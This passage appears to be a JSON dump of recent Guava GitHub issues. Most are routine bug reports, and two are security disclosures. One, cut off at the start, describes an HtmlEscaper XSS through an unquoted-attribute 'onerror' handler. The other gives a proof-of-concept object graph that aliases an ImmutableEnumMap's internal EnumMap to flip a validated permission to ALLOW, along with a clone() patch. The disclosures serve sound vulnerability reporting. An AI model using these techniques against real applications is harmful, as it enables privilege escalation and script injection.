opens the generated page, the attacker's value becomes an `onerror` handler on the avatar\nimage, and the browser executes it in the reviewer's origin.\n\nThis is not a Not An Issue case under the stated standard. The attacker's required capability is\nordinary profile-field control. That capability becomes same-origin script execution because the\nGuava API contract says the escaped output is suitable for HTML attribute values while the escaper\nleaves unquoted-attribute separators unchanged.\n\n[htmlEscaperXSS.tar.gz](https://github.com/user-attachments/files/27164991/htmlEscaperXSS.tar.gz)\n\n### Example\n\n```java\nsee htmlEscaperXSS.tar.gz\n```\n\n### Expected Behavior\n\nnone\n\n### Actual Behavior\n\nnone\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8387"
+    },
+    {
+        "id": 4343133552,
+        "number": 8386,
+        "title": "Security: ImmutableEnumMap deserialization can allow post-validation permission changes",
+        "state": "closed",
+        "created_at": "2026-04-28T12:30:20Z",
+        "updated_at": "2026-04-28T12:42:40Z",
+        "closed_at": "2026-04-28T12:42:40Z",
+        "author": "foxllb",
+        "comments": 0,
+        "labels": [
+            "type=defect"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\nlatest code\n\n### Description\n\n## Report description\nImmutableEnumMap deserialization can allow post-validation permission changes\n\n## The problem\n### Please describe the technical details of the vulnerability\n\n#### 1. technical details\n\n`ImmutableEnumMap` is Guava's specialized immutable map implementation for enum keys. For maps with\ntwo or more entries, `asImmutable()` wraps the supplied `EnumMap` directly:\n\n```java\nfinal class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutableMap<K, V> {\n  static <K extends Enum<K>, V> ImmutableMap<K, V> asImmutable(EnumMap<K, V> map) {\n    switch (map.size()) {\n      case 0:\n        return ImmutableMap.of();\n      case 1:\n        Entry<K, V> entry = getOnlyElement(map.entrySet());\n        return ImmutableMap.of(entry.getKey(), entry.getValue());\n      default:\n        return new ImmutableEnumMap<>(map);\n    }\n  }\n\n  private final transient EnumMap<K, V> delegate;\n\n  private ImmutableEnumMap(EnumMap<K, V> delegate) {\n    this.delegate = delegate;\n    checkArgument(!delegate.isEmpty());\n  }\n```\n\nThe immutable map's observable state is read from that delegate:\n\n```java\n  @Override\n  public int size() {\n    return delegate.size();\n  }\n\n  @Override\n  public boolean containsKey(@Nullable Object key) {\n    return delegate.containsKey(key);\n  }\n\n  @Override\n  public @Nullable V get(@Nullable Object key) {\n    return delegate.get(key);\n  }\n```\n\nDuring serialization, `ImmutableEnumMap` uses a serialization proxy that stores the same `EnumMap`\ndelegate:\n\n```java\n  @Override\n  @J2ktIncompatible // serialization\n  Object writeReplace() {\n    return new EnumSerializedForm<>(delegate);\n  }\n\n  @J2ktIncompatible // serialization\n  private static final class EnumSerializedForm<K extends Enum<K>, V> implements Serializable {\n    final EnumMap<K, V> delegate;\n\n    EnumSerializedForm(EnumMap<K, V> delegate) {\n      this.delegate = delegate;\n    }\n\n    Object readResolve() {\n      return new ImmutableEnumMap<>(delegate);\n    }\n  }\n```\n\nThe issue is that `readResolve()` constructs the deserialized `ImmutableEnumMap` with the proxy's\nmutable `EnumMap` delegate without making a defensive copy. A crafted serialized object graph can\ninclude both:\n\n- an `ImmutableEnumMap` that is reconstructed from this delegate, and\n- another application-visible field that references the same `EnumMap`.\n\nAfter deserialization, writes through the mutable `EnumMap` field change the already validated\n`ImmutableMap`. This violates the immutable snapshot contract that callers rely on after accepting\nan `ImmutableMap` from deserialization.\n\nGuava already uses the defensive pattern in the analogous `ImmutableEnumSet` serialization proxy:\n\n```java\nprivate static final class EnumSerializedForm<E extends Enum<E>> implements Serializable {\n  final EnumSet<E> delegate;\n\n  Object readResolve() {\n    // EJ2 #76: Write readObject() methods defensively.\n    return new ImmutableEnumSet<E>(delegate.clone());\n  }\n}\n```\n\n#### 2. vulnerability reproduction\n\nThe reproduction is implemented in:\n\n```text\n./work/guava/ImmutableEnumMapTest\n```\n\nThe test models a role-restore endpoint that receives one serialized request object. The request\ncontains an approved immutable permission snapshot and a separate mutable draft map used for review:\n\n```java\nprivate static final class RoleRestoreRequest implements Serializable {\n  private final ImmutableMap<AdminPermission, Decision> approvedPermissions;\n  private final EnumMap<AdminPermission, Decision> draftPermissionChanges;\n  private final AdminPermission requestedPermission;\n  private final Decision requestedDecision;\n}\n```\n\nThe service first validates the approved immutable snapshot:\n\n```java\nRoleRestoreRequest request;\ntry (ObjectInputStream input =\n    new ObjectInputStream(new ByteArrayInputStream(serializedRequest))) {\n  request = (RoleRestoreRequest) input.readObject();\n}\n\nImmutableMap<AdminPermission, Decision> approvedPermissions = request.approvedPermissions;\n\nDecision decisionDuringValidation = approvedPermissions.get(AdminPermission.DELETE_USERS);\nif (decisionDuringValidation == Decision.ALLOW) {\n  throw new SecurityException(\"Uploaded roles must not already grant DELETE_USERS.\");\n}\n```\n\nIt then records the requested change in the mutable draft map. This draft write is not supposed to\naffect the validated immutable permission snapshot:\n\n```java\nrequest.draftPermissionChanges.put(request.requestedPermission, request.requestedDecision);\n\nDecision decisionDuringAuthorization = approvedPermissions.get(AdminPermission.DELETE_USERS);\nboolean deleteUsersExecuted =\n    decisionDuringAuthorization == Decision.ALLOW && executeDeleteUsersMaintenanceTask();\n```\n\nThe malicious payload makes `draftPermissionChanges` reference the same `EnumMap` delegate that the\ndeserialized `ImmutableEnumMap` uses internally:\n\n```java\nEnumMap<AdminPermission, Decision> initialPermissions = new EnumMap<>(AdminPermission.class);\ninitialPermissions.put(AdminPermission.VIEW_AUDIT_LOGS, Decision.ALLOW);\ninitialPermissions.put(AdminPermission.DELETE_USERS, Decision.DENY);\n\nImmutableMap<AdminPermission, Decision> approvedPermissions =\n    ImmutableMap.copyOf(initialPermissions);\nEnumMap<AdminPermission, Decision> immutableMapDelegate =\n    extractImmutableEnumMapDelegate(approvedPermissions);\n\nRoleRestoreRequest maliciousRequest =\n    new RoleRestoreRequest(\n        approvedPermissions,\n        immutableMapDelegate,\n        AdminPermission.DELETE_USERS,\n        Decision.ALLOW);\n```\n\nThe reflection in the payload generator is only used to build the local serialized object graph for\nthe test. The service receives and processes ordinary serialized bytes and reads one top-level\nbusiness object.\n\nRun the reproduction:\n\n```bash\ncd ./work/guava\n./ImmutableEnumMapTest/scripts/run.sh\n```\n\nObserved output:\n\n```text\nSecurity validation observed DELETE_USERS=DENY\nAuthorization later observed DELETE_USERS=ALLOW\nPrivileged DELETE_USERS operation executed=true\nImpact: validation passed, but the immutable permission snapshot changed.\n```\n\nThe archived reproduction is available at:\n\n```text\n./work/guava/ImmutableEnumMapTest.tar.gz\n```\n\nSHA-256:\n\n```text\n53848c8cc76048676725354951d0c5d7599b783e90cac4e3634235a3f0a89dff\n```\n\n#### 3. patch\n\nClone the serialized `EnumMap` delegate before constructing the deserialized `ImmutableEnumMap`.\nThis breaks the attacker-controlled object graph alias while preserving the existing enum-key map\nbehavior.\n\n```diff\ndiff --git a/android/guava/src/com/google/common/collect/ImmutableEnumMap.java b/android/guava/src/com/google/common/collect/ImmutableEnumMap.java\nindex e53a04e..5963616 100644\n--- a/android/guava/src/com/google/common/collect/ImmutableEnumMap.java\n+++ b/android/guava/src/com/google/common/collect/ImmutableEnumMap.java\n@@ -121,7 +121,7 @@ final class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutabl\n     }\n \n     Object readResolve() {\n-      return new ImmutableEnumMap<>(delegate);\n+      return new ImmutableEnumMap<>(delegate.clone());\n     }\n \n     @GwtIncompatible @J2ktIncompatible private static final long serialVersionUID = 0;\ndiff --git a/guava/src/com/google/common/collect/ImmutableEnumMap.java b/guava/src/com/google/common/collect/ImmutableEnumMap.java\nindex 7238a06..0ed5d73 100644\n--- a/guava/src/com/google/common/collect/ImmutableEnumMap.java\n+++ b/guava/src/com/google/common/collect/ImmutableEnumMap.java\n@@ -142,7 +142,7 @@ final class ImmutableEnumMap<K extends Enum<K>, V> extends IteratorBasedImmutabl\n     }\n \n     Object readResolve() {\n-      return new ImmutableEnumMap<>(delegate);\n+      return new ImmutableEnumMap<>(delegate.clone());\n     }\n \n     @GwtIncompatible @J2ktIncompatible private static final long serialVersionUID = 0;\n```\n\n### Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so\n\nAn attacker who can submit a serialized object graph accepted by an application's restore/import\npath can make a mutable `EnumMap` field alias the internal delegate of a deserialized\n`ImmutableEnumMap`. If the application validates the immutable map and later updates the mutable map\nas draft or metadata state, the update can change the already validated immutable permission\nsnapshot.\n\nIn the demonstrated permission workflow, the attacker submits a role restore request where\n`DELETE_USERS` is denied during validation. The later draft update changes the same permission in the\nvalidated immutable snapshot to `ALLOW`, so the authorization step executes the privileged\n`DELETE_USERS` operation.\n\nThis should not be classified as Not An Issue under the stated principle. Given the triggering\ncapability, the attacker can provide request data that is still subject to the service's validation\nand normal approval workflow. That capability does not itself grant the approved `DELETE_USERS`\npermission, because the approved permission snapshot is checked before use. The additional effect\nintroduced by this bug is the ability to mutate that approved immutable snapshot after the security\ncheck by writing through a separate mutable field in the same deserialized object graph.\n\n[ImmutableEnumMapTest.tar.gz](https://github.com/user-attachments/files/27164935/ImmutableEnumMapTest.tar.gz)\n\n### Example\n\n```java\nsee ImmutableEnumMapTest.tar.gz\n```\n\n### Expected Behavior\n\nnone\n\n### Actual Behavior\n\nnone\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8386"
+    },
+    {
+        "id": 4281034292,
+        "number": 8356,
+        "title": "Guava 33.6.0 now brings a warning when used with GWT (2.13)",
+        "state": "closed",
+        "created_at": "2026-04-17T07:49:14Z",
+        "updated_at": "2026-04-17T21:56:04Z",
+        "closed_at": "2026-04-17T21:56:04Z",
+        "author": "lgemeinhardt",
+        "comments": 0,
+        "labels": [
+            "type=defect",
+            "package=collect",
+            "platform=gwt",
+            "P2"
+        ],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "### Guava Version\n\n33.6.0-jre\n\n### Description\n\nGuava 33.6.0 brings (via https://github.com/google/guava/commit/638ab1846d2e6e794b831f33cc063e6478a44040) now brings a warning when used with GWT (2.13)\n\n` Warnings in com/google/common/collect/super/com/google/common/collect/ImmutableMap.java`\n`  [WARN] Line 248: [unusable-by-js] Type of parameter 'entries' in 'ImmutableMap ImmutableMap.jsOfEntries(Map.Entry[])' is not usable by but exposed to JavaScript.`\n`  [WARN] Suppress \"[unusable-by-js]\" warnings by adding a @SuppressWarnings(\"unusable-by-js\") annotation to the corresponding member.`\n\nCould you please add the @SuppressWarnings(\"unusable-by-js\") to the method to avoid this warning, even if J2CL (and not GWT) is the (main) focus for Google?\n\n### Example\n\n```java\nUse ImmutableMap in GWT code\n```\n\n### Expected Behavior\n\nNo warning (as before)\n\n### Actual Behavior\n\nWarning (quite confusing) when used with GWT\n\n### Packages\n\ncom.google.common.collect\n\n### Platforms\n\nGWT\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8356"
+    },
+    {
+        "id": 4270651514,
+        "number": 8345,
+        "title": "java.lang.AssertionError for Google Guava Put and Remove Operation",
+        "state": "closed",
+        "created_at": "2026-04-15T17:44:55Z",
+        "updated_at": "2026-04-23T07:31:23Z",
+        "closed_at": "2026-04-16T21:51:03Z",
+        "author": "iamfahim",
+        "comments": 11,
+        "labels": [
+            "type=defect",
+            "package=cache",
+            "P2"
+        ],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "### Guava Version\n\n33.3.1-android\n\n### Description\n\nHello,\nrecently I have faced `java.lang.AssertionError` for my android application release apk.\nI have updated the following items for this year\n\n1. Apply ProGuard rules and enabled minify true for release apk\n2. Update android sdk version to 37\n\nEvery year I updated my sdk version but didn't face this type of issue. I suspect the main cause of apply ProGuard rules and enabled minify true for release apk.\n\nWould you please help me to solve this issue?\n\n### Example\n\n```java\nLoadingCache<Key, Graph> graphs = CacheBuilder.newBuilder()\n       .expireAfterWrite(1, TimeUnit.MINUTES)\n       .build(\n           new CacheLoader<Key, Graph>() {\n             public Graph load(Key key) throws AnyException {\n               return createExpensiveGraph(key);\n             }\n           });\n\n    public void put(Key key, Graph value) {\n        graphs.put(key, value);\n    }\n\n    public Graph get(Key key) {\n        return graphs.getIfPresent(key);\n    }\n```\n\n### Expected Behavior\n\nShould work it properly without any exception.\n\n### Actual Behavior\n\nAndroid runtime error: java.lang.AssertionError for Google Guava Put and Remove Operation\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8345"
+    },
+    {
+        "id": 4123601872,
+        "number": 8295,
+        "title": "ClassPathTest.testLocationsFrom_idempotentScan failure",
+        "state": "closed",
+        "created_at": "2026-03-23T20:41:36Z",
+        "updated_at": "2026-06-02T22:27:09Z",
+        "closed_at": "2026-06-02T22:27:09Z",
+        "author": "cpovirk",
+        "comments": 8,
+        "labels": [
+            "type=defect",
+            "package=general",
+            "P2"
+        ],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "```\nError:  Failures: \nError:    ClassPathTest.testLocationsFrom_idempotentScan:492 unexpected (5)\n#1      : target/surefire-reports/com.google.common.primitives.UnsignedLongsTest.txt\n#2      : target/surefire-reports/com.google.common.reflect.AbstractInvocationHandlerTest.txt\n#3      : target/surefire-reports/TEST-com.google.common.reflect.AbstractInvocationHandlerTest.xml\n#4      : target/surefire-reports/com.google.common.reflect.ClassPathTest-output.txt\n#5      : target/surefire-reports/TEST-com.google.common.primitives.UnsignedLongsTest.xml\n---\nexpected: [benchmark/com/google/common/cache/SegmentBenchmark.java, benchmark/com/google/common/cache/ChainBenchmark.java, ...\n```\n\nhttps://github.com/google/guava/actions/runs/23457793433/job/68251479033\n\nI guess that Surefire is putting its reports directory on the classpath? That seems weird. And then somehow some reports are getting written during the execution of an individual method in `ClassPathTest` (and not just `ClassPathTest-output.txt`)? That also seems weird.\n\nI'm going to hope that this goes away on its own, but I expect that we'll see it again....",
+        "url": "https://github.com/google/guava/issues/8295"
+    },
+    {
+        "id": 4038575016,
+        "number": 8248,
+        "title": "Test",
+        "state": "closed",
+        "created_at": "2026-03-07T14:14:06Z",
+        "updated_at": "2026-03-07T14:14:36Z",
+        "closed_at": "2026-03-07T14:14:36Z",
+        "author": "aaveshV",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": null,
+        "url": "https://github.com/google/guava/issues/8248"
+    },
+    {
+        "id": 4030466318,
+        "number": 8245,
+        "title": "`Future.exceptionNow` and `Future.resultNow`",
+        "state": "open",
+        "created_at": "2026-03-05T20:35:11Z",
+        "updated_at": "2026-04-14T16:08:40Z",
+        "closed_at": null,
+        "author": "benjaminp",
+        "comments": 2,
+        "labels": [
+            "type=enhancement",
+            "package=concurrent",
+            "P3"
+        ],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "Java 19 added `exceptionNow` and `resultNow` methods to the `Future` interface. There are default implementations on the interface, but Guava's future library could provide more efficient overrides. In particular, `exceptionNow()` could avoid raising an exception.\n\nThere's also `Future.state()` but that seems harder, since the return value is an enumeration added in Java 19.",
+        "url": "https://github.com/google/guava/issues/8245"
+    },
+    {
+        "id": 4024339509,
+        "number": 8243,
+        "title": "`EvictingQueue.add()` returns `true` when `maxSize == 0` but element is never added",
+        "state": "closed",
+        "created_at": "2026-03-04T21:48:30Z",
+        "updated_at": "2026-03-16T19:23:10Z",
+        "closed_at": "2026-03-16T12:41:11Z",
+        "author": "shanjiang98",
+        "comments": 10,
+        "labels": [
+            "type=defect",
+            "package=collect",
+            "P3"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\n33.5.0\n\n### Description\n\n### Summary\n\n`EvictingQueue.add(e)` returns `true` when `maxSize == 0`, but the element is silently discarded\nwithout being added to the queue. This violates the `Collection.add()` contract (JDK 21 Javadoc):\n\n> \"Returns `true` if this collection changed as a result of the call.\"\n\n### How this was found\n\nDetected by an automated JDK conformance oracle checking the `Collection.add()` contract:\n*\"if add(x) returns true, then contains(x) must return true\"*\n\n### Example\n\n```java\n### Reproducer\n\n\nimport com.google.common.collect.EvictingQueue;\n\nEvictingQueue<String> q = EvictingQueue.create(0);\nboolean result = q.add(\"hello\");\nSystem.out.println(\"add returned: \" + result);   // true\nSystem.out.println(\"size: \" + q.size());          // 0\nSystem.out.println(\"contains: \" + q.contains(\"hello\")); // false\n\n\n### Analysis\n\nIn [`EvictingQueue.add()`](https://github.com/google/guava/blob/master/guava/src/com/google/common/collect/EvictingQueue.java#L105-L115):\n\n\npublic boolean add(E e) {\n    checkNotNull(e);\n    if (maxSize == 0) {\n        return true;  // <-- returns true without adding\n    }\n    ...\n}\n\n\nThe early return at line 108 bypasses `delegate.add(e)` entirely. The Javadoc for `create()`\nstates *\"elements will be evicted immediately after being added\"*, but the implementation never\nadds the element in the first place.\n\n### Impact\n\nAny caller that relies on the return value of `add()` to determine whether the element was\naccepted will get incorrect results.\n```\n\n### Expected Behavior\n\n\n### Expected behavior\n\nEither:\n- Return `false` (the collection did not change), or\n- Actually add then remove the element to maintain contract compliance\n\n\n### Actual Behavior\n\n`EvictingQueue.add(e)` returns `true` when `maxSize == 0`, but the element is silently discarded\nwithout being added to the queue. This violates the `Collection.add()` contract (JDK 21 Javadoc):\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8243"
+    },
+    {
+        "id": 3980873680,
+        "number": 8222,
+        "title": "Poramon",
+        "state": "closed",
+        "created_at": "2026-02-24T00:49:49Z",
+        "updated_at": "2026-02-24T03:57:17Z",
+        "closed_at": "2026-02-24T03:57:17Z",
+        "author": "habib33901985697339-rgb",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "> ![image](https://user-images.githubusercontent.com/100335577/192419601-d9370cb0-5360-4a54-a106-db31dba9777e.png) \n\n _Originally posted by @Dogscat3831 in [#6186](https://github.com/google/guava/issues/6186#issuecomment-1258893085)_",
+        "url": "https://github.com/google/guava/issues/8222"
+    },
+    {
+        "id": 3980840154,
+        "number": 8221,
+        "title": "testMumurHash64 typo",
+        "state": "closed",
+        "created_at": "2026-02-24T00:36:33Z",
+        "updated_at": "2026-02-24T15:47:17Z",
+        "closed_at": "2026-02-24T15:47:17Z",
+        "author": "benjaminp",
+        "comments": 0,
+        "labels": [],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "In `guava-tests/test/com/google/common/hash/Fingerprint2011Test.java`. Presumably this should be `testMurmurHash64` with another \"r\".",
+        "url": "https://github.com/google/guava/issues/8221"
+    }
+]
